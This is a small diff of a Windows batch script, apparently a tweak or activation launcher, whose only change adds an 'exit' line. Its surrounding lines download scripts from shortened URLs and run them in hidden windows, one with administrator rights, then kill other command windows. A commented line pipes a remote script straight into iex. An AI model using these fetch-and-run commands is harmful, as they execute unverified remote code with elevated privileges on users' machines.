@@ -8,6 +8,7 @@ powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN1PJ' -OutFile \"$env:TEMP\
 
 curl -L "https://tinyurl.com/ztweak" -o "%TEMP%\VZX.bat" && (start /b "" powershell -w h -c "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" & taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne Administrator:  *")
 
+exit
 :: Tweaks
 :: powershell -Command "irm 'https://christitus.com/win' | iex"
 :: Windows Activation + Office
